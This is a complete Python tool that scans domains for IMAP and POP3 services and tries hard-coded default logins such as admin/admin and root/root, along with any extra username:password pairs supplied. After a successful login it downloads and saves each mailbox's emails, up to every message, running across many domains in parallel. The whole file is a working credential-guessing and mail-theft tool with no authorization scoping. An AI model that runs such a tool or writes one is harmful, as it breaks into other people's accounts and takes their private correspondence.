#!/usr/bin/env python3
"""
Enhanced Email Service Scanner
Scans domains for open IMAP/POP3 services, attempts common/default logins,
and retrieves metadata and emails. Saves results per domain.
Output is concise: only successful logins are shown with relevant details.
"""

import argparse
import concurrent.futures
import json
import logging
import os
import socket
import ssl
import sys
import time
from imaplib import IMAP4, IMAP4_SSL
from poplib import POP3, POP3_SSL, error_proto as POPError

# ---------- Default Configuration ----------
DEFAULT_OUTPUT_DIR = "email_backups"
DEFAULT_TIMEOUT = 10
DEFAULT_MAX_MSGS = 10
DEFAULT_THREADS = 5
DEFAULT_CREDENTIALS = [
    ("", ""),
    ("admin", ""),
    ("", "admin"),
    ("admin", "admin"),
    ("admin", "password"),
    ("root", ""),
    ("root", "root"),
    ("test", "test"),
    ("user", ""),
    ("user", "user"),
    ("postmaster", ""),
    ("postmaster", "postmaster"),
]

# IMAP: (port, use_ssl, use_starttls)
IMAP_PORTS = [
    (143, False, True),   # Plain with STARTTLS
    (993, True, False),   # SSL
]

# POP3: (port, use_ssl)
POP3_PORTS = [
    (110, False),         # Plain
    (995, True),          # SSL
]

# ---------- Argument Parsing ----------
def parse_args():
    parser = argparse.ArgumentParser(description="Scan domains for open email services and retrieve data.")
    parser.add_argument("domain_file", help="File containing one domain per line")
    parser.add_argument("-o", "--output", default=DEFAULT_OUTPUT_DIR, help="Output directory (default: %(default)s)")
    parser.add_argument("-t", "--threads", type=int, default=DEFAULT_THREADS, help="Number of threads (default: %(default)s)")
    parser.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT, help="Connection timeout in seconds (default: %(default)s)")
    parser.add_argument("--max-msgs", type=int, default=DEFAULT_MAX_MSGS, help="Maximum emails to fetch per mailbox (default: %(default)s). Ignored if --fetch-all is used.")
    parser.add_argument("--fetch-all", action="store_true", help="Fetch ALL messages (overrides --max-msgs)")
    parser.add_argument("--pop3-full", action="store_true", help="Fetch full POP3 messages instead of just headers")
    parser.add_argument("--credentials", help="File with credentials (one 'username:password' per line)")
    parser.add_argument("--no-ssl-verify", action="store_true", help="Disable SSL certificate verification (INSECURE)")
    parser.add_argument("--verbose", "-v", action="store_true", help="Increase logging verbosity (show failures and debug info)")
    return parser.parse_args()

# ---------- Logging Setup ----------
def setup_logging(verbose):
    level = logging.DEBUG if verbose else logging.INFO
    logging.basicConfig(
        level=level,
        format="%(asctime)s [%(levelname)s] %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S"
    )

# ---------- Helper Functions ----------
def ensure_dir(path):
    os.makedirs(path, exist_ok=True)

def save_text(filepath, content):
    with open(filepath, 'w', encoding='utf-8', errors='ignore') as f:
        f.write(content)

def save_json(filepath, data):
    with open(filepath, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, default=str)

def safe_decode(data):
    if isinstance(data, bytes):
        return data.decode('utf-8', errors='ignore')
    return data

def load_credentials(filepath):
    """Load credentials from a file: one 'username:password' per line."""
    creds = []
    with open(filepath, 'r') as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            if ':' in line:
                user, pwd = line.split(':', 1)
                creds.append((user, pwd))
            else:
                logging.warning(f"Skipping invalid credential line: {line}")
    return creds

# ---------- SSL Context ----------
def create_ssl_context(no_verify):
    context = ssl.create_default_context()
    if no_verify:
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
    return context

# ---------- IMAP Handling ----------
def check_imap(domain, port, use_ssl, use_starttls, creds, out_dir, timeout, max_msgs, ssl_context, fetch_all):
    """
    Attempt IMAP connection. Returns (success, summary_dict) where summary contains
    information about the scan (credentials used, capabilities, mailbox count, etc.)
    """
    conn = None
    summary = {
        "port": port,
        "service": "IMAP",
        "encryption": "SSL" if use_ssl else "STARTTLS" if use_starttls else "plain",
        "success": False,
        "credentials_used": None,
        "capabilities": [],
        "mailboxes": [],
        "message_count": 0,
        "fetched": 0,
        "error": None
    }

    try:
        if use_ssl:
            conn = IMAP4_SSL(domain, port, timeout=timeout, ssl_context=ssl_context)
        else:
            conn = IMAP4(domain, port, timeout=timeout)
            if use_starttls:
                conn.starttls(ssl_context=ssl_context)
    except Exception as e:
        summary["error"] = f"Connection failed: {e}"
        return False, summary

    # Try credentials
    for user, passwd in creds:
        try:
            conn.login(user, passwd)
            logging.debug(f"[IMAP] {domain}:{port} - Login successful with {user}/{passwd}")
            summary["success"] = True
            summary["credentials_used"] = f"{user}:{passwd}"

            # Capabilities
            try:
                typ, data = conn.capability()
                caps = safe_decode(data[0]).split()
                summary["capabilities"] = caps
                save_text(os.path.join(out_dir, "capabilities.txt"), safe_decode(data[0]))
            except Exception as e:
                logging.debug(f"Capability failed: {e}")

            # List mailboxes
            mailboxes_raw = []
            mailbox_names = []
            try:
                typ, data = conn.list()
                for item in data:
                    decoded = safe_decode(item)
                    mailboxes_raw.append(decoded)
                    # Extract mailbox name (simplistic: take last quoted or last part)
                    if decoded.startswith('* LIST'):
                        parts = decoded.split('"')
                        if len(parts) >= 2:
                            name = parts[1]
                        else:
                            name = decoded.split()[-1]
                    else:
                        name = decoded.split()[-1]
                    mailbox_names.append(name.strip('"'))
            except Exception as e:
                logging.debug(f"LIST failed: {e}")
            summary["mailboxes"] = mailbox_names
            save_text(os.path.join(out_dir, "mailboxes_raw.txt"), "\n".join(mailboxes_raw))
            save_text(os.path.join(out_dir, "mailboxes.txt"), "\n".join(mailbox_names))

            # Try to select INBOX
            target_mbox = "INBOX"
            try:
                typ, data = conn.select(target_mbox)
            except Exception:
                # Fallback to first mailbox
                if mailbox_names:
                    target_mbox = mailbox_names[0]
                    try:
                        typ, data = conn.select(target_mbox)
                    except Exception as e:
                        logging.debug(f"Select failed for {target_mbox}: {e}")
                        data = [0]
                else:
                    data = [0]

            msg_count = int(data[0]) if data and data[0] else 0
            summary["message_count"] = msg_count
            save_text(os.path.join(out_dir, f"{target_mbox}_count.txt"), str(msg_count))

            # Determine how many messages to fetch
            fetch_limit = msg_count if fetch_all else min(msg_count, max_msgs)
            fetched = 0
            for i in range(1, fetch_limit + 1):
                try:
                    typ, data = conn.fetch(str(i), "(RFC822)")
                    raw_email = data[0][1]
                    save_text(os.path.join(out_dir, f"msg_{i}.eml"), safe_decode(raw_email))
                    fetched += 1
                    time.sleep(0.2)  # be gentle
                except Exception as e:
                    logging.debug(f"Failed to fetch message {i}: {e}")
            summary["fetched"] = fetched

            conn.close()
            conn.logout()
            return True, summary

        except Exception as e:
            logging.debug(f"Login failed for {user}/{passwd}: {e}")
            continue

    # No credentials worked
    summary["error"] = "No valid credentials"
    try:
        conn.close()
        conn.logout()
    except:
        pass
    return False, summary

# ---------- POP3 Handling ----------
def check_pop3(domain, port, use_ssl, creds, out_dir, timeout, max_msgs, ssl_context, pop3_full, fetch_all):
    conn = None
    summary = {
        "port": port,
        "service": "POP3",
        "encryption": "SSL" if use_ssl else "plain",
        "success": False,
        "credentials_used": None,
        "message_count": 0,
        "total_size": 0,
        "fetched": 0,
        "error": None
    }

    try:
        if use_ssl:
            conn = POP3_SSL(domain, port, timeout=timeout, context=ssl_context)
        else:
            conn = POP3(domain, port, timeout=timeout)
    except Exception as e:
        summary["error"] = f"Connection failed: {e}"
        return False, summary

    # Try credentials
    for user, passwd in creds:
        try:
            conn.user(user)
            conn.pass_(passwd)
            logging.debug(f"[POP3] {domain}:{port} - Login successful with {user}/{passwd}")
            summary["success"] = True
            summary["credentials_used"] = f"{user}:{passwd}"

            # Get mailbox status
            msg_count, total_size = conn.stat()
            summary["message_count"] = msg_count
            summary["total_size"] = total_size
            save_text(os.path.join(out_dir, "stat.txt"), f"Messages: {msg_count}, Size: {total_size}")

            # Determine fetch limit
            fetch_limit = msg_count if fetch_all else min(msg_count, max_msgs)
            fetched = 0
            for i in range(1, fetch_limit + 1):
                try:
                    if pop3_full:
                        # Fetch full message
                        lines = conn.retr(i)[1]
                        msg_content = "\n".join(safe_decode(l) for l in lines)
                        save_text(os.path.join(out_dir, f"msg_{i}.eml"), msg_content)
                    else:
                        # Retrieve only headers
                        lines = conn.top(i, 0)[1]
                        msg_header = "\n".join(safe_decode(l) for l in lines)
                        save_text(os.path.join(out_dir, f"msg_{i}_headers.txt"), msg_header)
                    fetched += 1
                    time.sleep(0.2)
                except Exception as e:
                    logging.debug(f"Failed to fetch message {i}: {e}")
            summary["fetched"] = fetched

            conn.quit()
            return True, summary

        except Exception as e:
            logging.debug(f"POP3 login failed for {user}/{passwd}: {e}")
            continue

    summary["error"] = "No valid credentials"
    try:
        conn.quit()
    except:
        pass
    return False, summary

# ---------- Domain Scanner ----------
def scan_domain(domain, args, creds, ssl_context):
    """Scan a single domain for IMAP and POP3 services."""
    domain_out = os.path.join(args.output, domain)
    ensure_dir(domain_out)

    summary = {
        "domain": domain,
        "timestamp": time.time(),
        "services": []
    }

    # IMAP checks
    for port, use_ssl, use_starttls in IMAP_PORTS:
        out_dir = os.path.join(domain_out, f"imap_{port}")
        ensure_dir(out_dir)
        success, svc_summary = check_imap(
            domain, port, use_ssl, use_starttls,
            creds, out_dir, args.timeout, args.max_msgs, ssl_context, args.fetch_all
        )
        svc_summary["domain"] = domain
        svc_summary["success"] = success
        summary["services"].append(svc_summary)
        if success:
            # Display concise success info
            cred_display = svc_summary["credentials_used"] or "none"
            enc = svc_summary["encryption"]
            print(f"[SUCCESS] {domain}: IMAP/{port} ({enc}) - {cred_display} - msgs: {svc_summary['message_count']} (fetched {svc_summary['fetched']})")

    # POP3 checks
    for port, use_ssl in POP3_PORTS:
        out_dir = os.path.join(domain_out, f"pop3_{port}")
        ensure_dir(out_dir)
        success, svc_summary = check_pop3(
            domain, port, use_ssl,
            creds, out_dir, args.timeout, args.max_msgs, ssl_context, args.pop3_full, args.fetch_all
        )
        svc_summary["domain"] = domain
        svc_summary["success"] = success
        summary["services"].append(svc_summary)
        if success:
            cred_display = svc_summary["credentials_used"] or "none"
            enc = svc_summary["encryption"]
            total_size_mb = svc_summary["total_size"] / (1024*1024) if svc_summary["total_size"] else 0
            print(f"[SUCCESS] {domain}: POP3/{port} ({enc}) - {cred_display} - msgs: {svc_summary['message_count']} (total {total_size_mb:.2f} MB, fetched {svc_summary['fetched']})")

    # Save domain summary
    save_json(os.path.join(domain_out, "summary.json"), summary)
    return summary

# ---------- Main ----------
def main():
    global args
    args = parse_args()
    setup_logging(args.verbose)

    # Check domain file
    if not os.path.isfile(args.domain_file):
        logging.error(f"Domain file '{args.domain_file}' not found.")
        sys.exit(1)

    # Load domains
    with open(args.domain_file, 'r') as f:
        domains = [line.strip() for line in f if line.strip()]
    if not domains:
        logging.error("No domains found in file.")
        sys.exit(1)
    logging.info(f"Loaded {len(domains)} domains.")

    # Load credentials
    creds = DEFAULT_CREDENTIALS.copy()
    if args.credentials:
        if os.path.isfile(args.credentials):
            try:
                extra_creds = load_credentials(args.credentials)
                creds.extend(extra_creds)
                logging.info(f"Loaded {len(extra_creds)} additional credentials.")
            except Exception as e:
                logging.error(f"Failed to load credentials file: {e}")
                sys.exit(1)
        else:
            logging.error(f"Credentials file '{args.credentials}' not found.")
            sys.exit(1)

    # SSL context
    ssl_context = create_ssl_context(args.no_ssl_verify)

    # Ensure output directory exists
    ensure_dir(args.output)

    # Scan domains (multithreaded)
    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
        future_to_domain = {
            executor.submit(scan_domain, domain, args, creds, ssl_context): domain
            for domain in domains
        }
        for future in concurrent.futures.as_completed(future_to_domain):
            domain = future_to_domain[future]
            try:
                summary = future.result()
                results.append(summary)
                # No "Completed scan" line printed here
            except Exception as e:
                logging.error(f"Error scanning {domain}: {e}")

    # Save global summary
    global_summary = {
        "timestamp": time.time(),
        "domains_scanned": len(domains),
        "results": results
    }
    save_json(os.path.join(args.output, "global_summary.json"), global_summary)
    logging.info(f"All scans completed. Results saved under {args.output}")

if __name__ == "__main__":
    main()
